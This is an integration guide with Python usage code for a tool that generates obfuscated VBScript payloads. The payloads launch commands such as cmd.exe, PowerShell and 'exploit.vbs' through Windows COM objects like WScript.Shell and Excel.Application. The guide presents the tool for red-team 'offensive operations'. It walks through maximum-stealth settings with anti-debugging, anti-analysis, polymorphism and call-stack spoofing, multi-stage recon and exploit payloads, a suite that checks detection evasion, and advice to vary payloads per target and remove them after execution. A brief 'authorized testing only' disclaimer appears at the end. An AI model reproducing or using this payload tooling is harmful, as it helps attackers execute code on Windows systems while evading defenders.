# Hardened COM Execution Integration Guide

## Quick Start

### Installation

```bash
# Clone or copy the hardened COM module
cp com_hardened_execution.py /path/to/project/

# No external dependencies required - uses only Python stdlib
python3 -c "from com_hardened_execution import HardenedCOMExecutor; print('Ready')"
```

### Basic Usage

```python
from com_hardened_execution import HardenedCOMExecutor

# Create executor
executor = HardenedCOMExecutor()

# Generate hardened payload
payload = executor.generate_complete_hardened_payload(
    progid="WScript.Shell",
    clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
    method="Run",
    command="cmd.exe"
)

# Save to file
with open("payload.vbs", "w") as f:
    f.write(payload)
```

## Integration Scenarios

### 1. Red Team Operations

```python
from com_hardened_execution import HardenedCOMExecutor, HardeningConfig

# Maximum stealth for offensive operations
config = HardeningConfig(
    stealth_level=10,
    jitter_range_ms=(500, 2000),
    enable_anti_debugging=True,
    enable_anti_analysis=True,
    enable_polymorphism=True,
    enable_reflection_blocking=True,
)

executor = HardenedCOMExecutor(config)

# Generate multi-stage payload
recon_payload = executor.generate_complete_hardened_payload(
    progid="WScript.Shell",
    clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
    method="Run",
    command="powershell -Command Get-Process"
)

exploit_payload = executor.generate_complete_hardened_payload(
    progid="Excel.Application",
    clsid="{00024500-0000-0000-C000-000000000046}",
    method="Run",
    command="exploit.vbs"
)

# Save stages
with open("stage1_recon.vbs", "w") as f:
    f.write(recon_payload)
with open("stage2_exploit.vbs", "w") as f:
    f.write(exploit_payload)
```

### 2. Security Testing

```python
from com_hardened_execution import HardenedCOMExecutor

# Standard configuration for security testing
executor = HardenedCOMExecutor()

# Generate test payloads for various COM objects
test_cases = [
    ("WScript.Shell", "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}", "cmd.exe"),
    ("Excel.Application", "{00024500-0000-0000-C000-000000000046}", "calc.exe"),
    ("WbemScripting.SWbemLocator", "{76A64158-CB41-11D1-8B02-00600806D9B6}", "wmi"),
]

for progid, clsid, command in test_cases:
    payload = executor.generate_complete_hardened_payload(
        progid=progid,
        clsid=clsid,
        method="Run",
        command=command
    )
    
    filename = f"test_{progid.split('.')[-1].lower()}.vbs"
    with open(filename, "w") as f:
        f.write(payload)
    
    print(f"Generated: {filename} ({len(payload)} bytes)")
```

### 3. Payload Generation Framework

```python
from com_hardened_execution import HardenedCOMExecutor, HardeningConfig
import json

class PayloadGenerator:
    """Wrapper for payload generation"""
    
    def __init__(self, stealth_level=5):
        self.config = HardeningConfig(stealth_level=stealth_level)
        self.executor = HardenedCOMExecutor(self.config)
    
    def generate(self, progid, clsid, method, command):
        """Generate hardened payload"""
        return self.executor.generate_complete_hardened_payload(
            progid=progid,
            clsid=clsid,
            method=method,
            command=command
        )
    
    def generate_batch(self, tasks):
        """Generate multiple payloads"""
        results = {}
        for task_id, (progid, clsid, method, command) in enumerate(tasks):
            payload = self.generate(progid, clsid, method, command)
            results[f"task_{task_id}"] = {
                "size": len(payload),
                "payload": payload[:500],  # Preview
                "full_size": len(payload)
            }
        return results

# Usage
generator = PayloadGenerator(stealth_level=8)

tasks = [
    ("WScript.Shell", "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}", "Run", "cmd"),
    ("Excel.Application", "{00024500-0000-0000-C000-000000000046}", "Run", "calc"),
]

results = generator.generate_batch(tasks)
print(json.dumps(results, indent=2))
```

### 4. Detection Testing

```python
from com_hardened_execution import HardenedCOMExecutor

class DetectionTestSuite:
    """Test suite for detection evasion"""
    
    def __init__(self):
        self.executor = HardenedCOMExecutor()
        self.results = {}
    
    def test_static_detection(self):
        """Test against static CLSID detection"""
        payload = self.executor.generate_complete_hardened_payload(
            progid="WScript.Shell",
            clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
            method="Run",
            command="test"
        )
        
        # Check if CLSID appears in plaintext
        has_clsid = "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}" in payload
        self.results['static_clsid_detection'] = {
            'vulnerable': has_clsid,
            'status': 'PASS' if not has_clsid else 'FAIL'
        }
        return not has_clsid
    
    def test_dynamic_detection(self):
        """Test against dynamic interface inspection"""
        payload = self.executor.generate_complete_hardened_payload(
            progid="WScript.Shell",
            clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
            method="Run",
            command="test"
        )
        
        # Check for reflection blocking
        has_reflection_blocking = 'BlockIntrospection' in payload
        self.results['reflection_blocking'] = {
            'implemented': has_reflection_blocking,
            'status': 'PASS' if has_reflection_blocking else 'FAIL'
        }
        return has_reflection_blocking
    
    def test_timing_obfuscation(self):
        """Test timing obfuscation"""
        payload = self.executor.generate_complete_hardened_payload(
            progid="WScript.Shell",
            clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
            method="Run",
            command="test"
        )
        
        # Check for timing jitter
        has_jitter = 'WScript.Sleep' in payload or 'Thread.Sleep' in payload
        self.results['timing_jitter'] = {
            'implemented': has_jitter,
            'status': 'PASS' if has_jitter else 'FAIL'
        }
        return has_jitter
    
    def run_all_tests(self):
        """Run all detection tests"""
        self.test_static_detection()
        self.test_dynamic_detection()
        self.test_timing_obfuscation()
        
        return self.results

# Usage
suite = DetectionTestSuite()
results = suite.run_all_tests()

for test, result in results.items():
    print(f"{test}: {result['status']}")
```

## Advanced Integration

### Custom Obfuscation Chains

```python
from com_hardened_execution import (
    HardenedCOMExecutor,
    HardeningConfig,
    ObfuscationLayer,
    MemoryProtectionMode
)

# Custom obfuscation chain
custom_config = HardeningConfig(
    obfuscation_layers=[
        ObfuscationLayer.INTERFACE_HIDING,
        ObfuscationLayer.CLSID_POLYMORPHISM,
        ObfuscationLayer.METHOD_INDIRECTION,
        ObfuscationLayer.REFLECTION_BLOCKING,
        ObfuscationLayer.TIMING_JITTER,
        ObfuscationLayer.CALL_STACK_SPOOFING,
        ObfuscationLayer.API_WRAPPING,
    ],
    memory_protection=[
        MemoryProtectionMode.HEAP_RANDOMIZATION,
        MemoryProtectionMode.DEP_ENABLED,
        MemoryProtectionMode.CFG_COMPATIBLE,
        MemoryProtectionMode.CET_COMPATIBLE,
    ],
    stealth_level=10,
    jitter_range_ms=(300, 1200),
)

executor = HardenedCOMExecutor(custom_config)
payload = executor.generate_complete_hardened_payload(
    progid="WScript.Shell",
    clsid="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
    method="Run",
    command="command.exe"
)
```

### Pipeline Integration

```python
from com_hardened_execution import HardenedCOMExecutor
import hashlib
import base64

class PayloadPipeline:
    """Full payload generation pipeline"""
    
    def __init__(self):
        self.executor = HardenedCOMExecutor()
        self.pipeline_stages = []
    
    def add_stage(self, stage_name, stage_func):
        """Add pipeline stage"""
        self.pipeline_stages.append((stage_name, stage_func))
        return self
    
    def execute(self, progid, clsid, method, command):
        """Execute full pipeline"""
        
        # Stage 1: Generate base payload
        payload = self.executor.generate_complete_hardened_payload(
            progid=progid,
            clsid=clsid,
            method=method,
            command=command
        )
        
        result = {
            'stage_1_generated': len(payload),
            'payload': payload
        }
        
        # Execute custom stages
        for stage_name, stage_func in self.pipeline_stages:
            payload = stage_func(payload)
            result[f'stage_{stage_name}'] = len(payload)
        
        return result

# Usage with custom stages
pipeline = PayloadPipeline()

# Add base64 encoding stage
pipeline.add_stage('encode_base64', 
    lambda p: base64.b64encode(p.encode()).decode())

# Add compression stage (if desired)
pipeline.add_stage('hash_verify',
    lambda p: hashlib.sha256(p.encode()).hexdigest())

result = pipeline.execute(
    "WScript.Shell",
    "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",
    "Run",
    "cmd.exe"
)

print(f"Original size: {result['stage_1_generated']}")
print(f"After base64: {result['stage_encode_base64']}")
```

## Performance Optimization

### Caching Strategies

```python
from com_hardened_execution import HardenedCOMExecutor
from functools import lru_cache

class CachedPayloadGenerator:
    """Payload generator with caching"""
    
    def __init__(self):
        self.executor = HardenedCOMExecutor()
    
    @lru_cache(maxsize=128)
    def get_cached_payload(self, progid_hash):
        """Cache payloads by progid hash"""
        # Implementation would map hash to cached payload
        pass
    
    def generate_with_cache(self, progid, clsid, method, command, use_cache=True):
        """Generate with optional caching"""
        if use_cache:
            cache_key = hash(progid)
            # Check cache
        
        # Generate
        return self.executor.generate_complete_hardened_payload(
            progid=progid,
            clsid=clsid,
            method=method,
            command=command
        )
```

### Batch Processing

```python
from com_hardened_execution import HardenedCOMExecutor
from concurrent.futures import ThreadPoolExecutor

class BatchPayloadGenerator:
    """Generate multiple payloads efficiently"""
    
    def __init__(self, max_workers=4):
        self.executor = HardenedCOMExecutor()
        self.max_workers = max_workers
    
    def generate_payload(self, task):
        """Generate single payload"""
        progid, clsid, method, command = task
        return self.executor.generate_complete_hardened_payload(
            progid=progid,
            clsid=clsid,
            method=method,
            command=command
        )
    
    def generate_batch(self, tasks):
        """Generate multiple payloads in parallel"""
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            results = list(executor.map(self.generate_payload, tasks))
        return results

# Usage
tasks = [
    ("WScript.Shell", "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}", "Run", "cmd"),
    ("Excel.Application", "{00024500-0000-0000-C000-000000000046}", "Run", "calc"),
    ("Word.Application", "{000209FF-0000-0000-C000-000000000046}", "Run", "notepad"),
]

generator = BatchPayloadGenerator(max_workers=4)
payloads = generator.generate_batch(tasks)

for i, payload in enumerate(payloads):
    print(f"Task {i}: {len(payload)} bytes")
```

## Troubleshooting

### Common Issues

**Issue**: "COM object not found"
**Solution**: Verify CLSID is installed on system
```python
# Test CLSID availability
import subprocess
result = subprocess.run(['oleview.exe'], capture_output=True)
```

**Issue**: "Payload too large"
**Solution**: Reduce stealth level or disable non-essential layers
```python
config = HardeningConfig(stealth_level=3)  # Reduced from 10
executor = HardenedCOMExecutor(config)
```

**Issue**: "Timing detection"
**Solution**: Increase jitter range
```python
config = HardeningConfig(jitter_range_ms=(500, 3000))
executor = HardenedCOMExecutor(config)
```

## Best Practices

1. **Vary Configurations**: Use different stealth levels for different operations
2. **Test Before Deployment**: Always test payloads in lab environment
3. **Monitor Detection**: Track which evasion techniques are being bypassed
4. **Update Regularly**: Refresh obfuscation strategies as detection evolves
5. **Compartmentalize**: Use different payloads for different targets
6. **Clean Up**: Remove payloads after execution
7. **Document Operations**: Track which techniques were successful

## Security Considerations

- This tool is for authorized security testing only
- Unauthorized access is illegal in most jurisdictions
- Always obtain written permission before testing
- Use in isolated lab environments when possible
- Log all operations for audit purposes
- Consider compliance requirements (HIPAA, PCI-DSS, etc.)

## Support & Resources

- Full API documentation: See `com_hardened_execution.py` source
- Examples: See `hardened_com_examples.py`
- Reference guide: See `HARDENED_COM_EXECUTION_GUIDE.md`
- GitHub issues: Report bugs and feature requests
